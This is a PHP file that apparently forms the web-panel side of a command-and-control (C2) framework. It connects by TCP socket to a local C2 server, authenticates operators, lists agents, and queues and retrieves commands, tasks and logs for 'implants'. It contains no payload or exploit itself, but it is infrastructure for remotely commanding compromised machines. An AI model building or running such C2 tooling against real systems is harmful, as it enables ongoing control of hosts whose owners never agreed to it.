<?php 
/*
Core server and web panel communication api
*/


$c2 = "127.0.0.1";
$port = 8883;
$socket;


function onSocketFailure(string $message, $socket = null) {
    if(is_resource($socket)) {
    $message .= ": " . socket_strerror(socket_last_error($socket));
    }
    die($message);
   }

function c2_conn() {
    global $socket, $c2, $port;
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) {
        onSocketFailure("Failed to create socket: " . socket_strerror(socket_last_error()));
    }
    socket_connect($socket, $c2, $port) or onSocketFailure("Failed to connect to c2 server", $socket);
    
}

function authenticate($username, $password) {
    global $socket;
    $creds = [
        'username' => "$username",
        'password' => "$password"
    ];

    $credentials = json_encode($creds);
    #$sock = $_SESSION['sock'];


    // send over socket to core server
    socket_write($socket, $credentials);

    // wait to recieve if authenticated
    $response = socket_read($socket, 1024);
    $auth = json_decode($response);
    if ($auth->operator === "true") {
        return 0;
    } elseif ($auth->operator === "false") {
        return -1; 
    }

    return -1;
}


function AgentInfo() {
    global $socket;
    $json = [
        "Info" => "Agents"
    ];
    // send
    $data = json_encode($json);
    socket_write($socket, $data);

    $chunk_size = 4096; 
    $recv_data = '';
    while (true) {
        $dat = socket_read($socket, $chunk_size);
        if ($dat === false || $dat === '') {
            break;
        }
        $recv_data .= $dat;
    }
    
    return json_decode($recv_data);
}

function tasks_per_agent($implant_id) {
    global $socket;
    $json = [
        "Info" => "implant_id",
        "implant_id" => $implant_id
    ];

    $data = json_encode($json);
    socket_write($socket, $data, strlen($data));



}

function NewTask($implant_id, $command) {
    global $socket;
    $json = [
        "Info" => "new_task",
        "implant_id" => $implant_id,
        "command" => $command
    ];
    $data = json_encode($json);
    socket_write($socket, $data, strlen($data));

    $chunk_size = 4096; 
    $recv_data = '';
    while (true) {
        $dat = socket_read($socket, $chunk_size);
        if ($dat === false || $dat === '') {
            break;
        }
        $recv_data .= $dat;
    }
    
    return json_decode($recv_data);

} 

function TasksInfo() {
    global $socket;
    $json = [
        "Info" => "Tasks"
    ];
    $data = json_encode($json);
    socket_write($socket, $data, strlen($data));

    $chunk_size = 4096; 
    $recv_data = '';
    while (true) {
        $dat = socket_read($socket, $chunk_size);
        if ($dat === false || $dat === '') {
            break;
        }
        $recv_data .= $dat;
    }
    
    return json_decode($recv_data);
}

function LogsInfo() {
    global $socket;
    $json = [
        "Info" => "Logs"
    ];
    $data = json_encode($json);
    socket_write($socket, $data, strlen($data));

    $chunk_size = 4096; 
    $recv_data = '';
    while (true) {
        $dat = socket_read($socket, $chunk_size);
        if ($dat === false || $dat === '') {
            break;
        }
        $recv_data .= $dat;
    }
    
    return json_decode($recv_data);

}

?>